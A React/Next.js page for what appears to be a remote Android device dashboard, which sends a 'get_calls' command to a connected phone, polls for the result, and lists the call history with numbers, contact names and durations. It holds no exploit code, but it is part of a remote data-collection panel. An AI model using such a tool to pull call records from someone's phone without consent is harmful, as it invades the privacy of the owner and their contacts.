'use client'
import { Suspense, useEffect } from 'react'
import { useState } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { useBadge } from '@/contexts/BadgeContext'
import { Phone, RefreshCw, Circle, Download } from 'lucide-react'

interface CallEntry { date: string; type: string; number: string; name: string; duration: string }

function parseCalls(text: string): CallEntry[] {
  const lines = text.split('\n').filter(l => l.trim() && !l.startsWith('===') && !l.startsWith('Total') && !l.startsWith('No calls'))
  return lines.map(line => {
    const m = line.match(/^\[([^\]]+)\]\[([^\]]+)\]\s*([^\s—]+)(.*?)—\s*(\d+)s/)
    if (m) {
      const name = m[4].match(/\(([^)]+)\)/)?.[1] ?? ''
      return { date: m[1], type: m[2], number: m[3].trim(), name, duration: `${m[5]}s` }
    }
    return { date: '', type: '', number: '', name: '', duration: '' }
  }).filter(e => e.date)
}

async function smartPoll(
  deviceId: string,
  cmdPrefix: string,
  sentAt: number,
  maxAttempts = 15,
  intervalMs = 800
): Promise<string | null> {
  for (let i = 0; i < maxAttempts; i++) {
    await new Promise(r => setTimeout(r, i === 0 ? 1200 : intervalMs))
    const r = await fetch(`/api/device/result?deviceId=${deviceId}`)
    const d = await r.json()
    const match = (d.history ?? [])
      .filter((h: { command: string; result: string; timestamp: string }) =>
        h.command.startsWith(cmdPrefix) && new Date(h.timestamp).getTime() > sentAt - 500)
      .sort((a: { timestamp: string }, b: { timestamp: string }) =>
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
    if (match?.result) return match.result as string
  }
  return null
}

function CallsContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const { notifyCallsCount, clearCallsBadge } = useBadge()
  const [entries, setEntries] = useState<CallEntry[]>([])
  const [loading, setLoading] = useState(false)
  const [limit, setLimit] = useState('50')

  useEffect(() => { clearCallsBadge() }, [clearCallsBadge])

  const fetchCalls = async () => {
    if (!selectedId) return
    setLoading(true)
    try {
      const sentAt = Date.now()
      await fetch('/api/device/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: `get_calls:${limit}` }),
      })
      const result = await smartPoll(selectedId, 'get_calls', sentAt)
      if (result) {
        const parsed = parseCalls(result)
        setEntries(parsed)
        notifyCallsCount(parsed.length)
        clearCallsBadge()
      }
    } finally { setLoading(false) }
  }

  const typeColor = (type: string) => {
    if (type.includes('IN')) return 'bg-android-green/10 text-android-green'
    if (type.includes('OUT')) return 'bg-android-blue/10 text-android-blue'
    return 'bg-android-red/10 text-android-red'
  }
  const typeLabel = (type: string) => {
    if (type.includes('IN')) return 'Incoming'
    if (type.includes('OUT')) return 'Outgoing'
    return 'Missed'
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-4xl mx-auto px-3 md:px-6 py-4 md:py-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2"><Phone size={20} className="text-android-green" /> Call Log</h2>
              <p className="text-android-muted text-xs mt-0.5">View call history from the connected device</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />{connected ? 'Online' : 'Offline'}
            </div>
          </div>

          <div className="flex gap-2 mb-4">
            <select value={limit} onChange={e => setLimit(e.target.value)}
              className="bg-android-surface border border-android-border text-android-text text-xs rounded-lg px-3 py-2 outline-none">
              <option value="20">Last 20</option><option value="50">Last 50</option><option value="100">Last 100</option>
            </select>
            <button onClick={fetchCalls} disabled={!connected || loading}
              className="flex items-center gap-2 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed">
              {loading ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
              {loading ? 'Fetching…' : 'Fetch Calls'}
            </button>
          </div>

          {!connected && <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl"><Phone size={32} className="mx-auto mb-3 text-android-border" />Connect a device to view call log</div>}

          {connected && entries.length === 0 && !loading && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <Phone size={32} className="mx-auto mb-3 text-android-border" /><p>Click &quot;Fetch Calls&quot; to load call log</p>
            </div>
          )}

          {entries.length > 0 && (
            <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden">
              <div className="px-4 py-2.5 border-b border-android-border text-xs text-android-muted">{entries.length} calls</div>
              <div className="divide-y divide-android-border/50">
                {entries.map((e, i) => (
                  <div key={i} className="flex items-center gap-3 px-4 py-3 hover:bg-white/5">
                    <span className={`shrink-0 text-xs px-2 py-1 rounded font-medium ${typeColor(e.type)}`}>{typeLabel(e.type)}</span>
                    <div className="flex-1 min-w-0">
                      <p className="text-android-text text-sm font-semibold font-mono">{e.number}</p>
                      {e.name && <p className="text-android-muted text-xs">{e.name}</p>}
                    </div>
                    <div className="text-right shrink-0">
                      <p className="text-android-text text-xs">{e.duration}</p>
                      <p className="text-android-muted text-xs">{e.date}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}

export default function CallsPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <CallsContent />
    </Suspense>
  )
}
